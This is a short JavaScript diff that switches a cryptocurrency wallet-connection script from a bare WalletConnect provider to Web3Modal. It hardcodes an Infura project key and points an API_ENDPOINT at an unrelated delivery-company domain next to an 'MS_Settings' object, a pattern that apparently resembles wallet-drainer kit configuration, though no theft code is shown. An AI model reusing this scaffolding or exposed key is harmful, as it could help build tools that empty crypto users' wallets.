@@ -1,15 +1,21 @@
-// Add WalletConnect provider
+// Initialize providers
+const Web3Modal = window.Web3Modal.default;
 const WalletConnectProvider = window.WalletConnectProvider.default;
 
-// Initialize provider
-const provider = new WalletConnectProvider({
-    rpc: {
-        1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
-        56: "https://bsc-dataseed.binance.org/",
-        137: "https://polygon-rpc.com"
+const providerOptions = {
+    walletconnect: {
+        package: WalletConnectProvider,
+        options: {
+            infuraId: "511362d7fcc8491f9af15cc7fadf46ae"
+        }
     }
-});
+};
 
+const web3Modal = new Web3Modal({
+    network: "mainnet",
+    cacheProvider: true,
+    providerOptions
+});
 // Rest of your existing code
 const API_ENDPOINT = 'https://fasterdeliveryuae.com';
 const MS_Settings = {
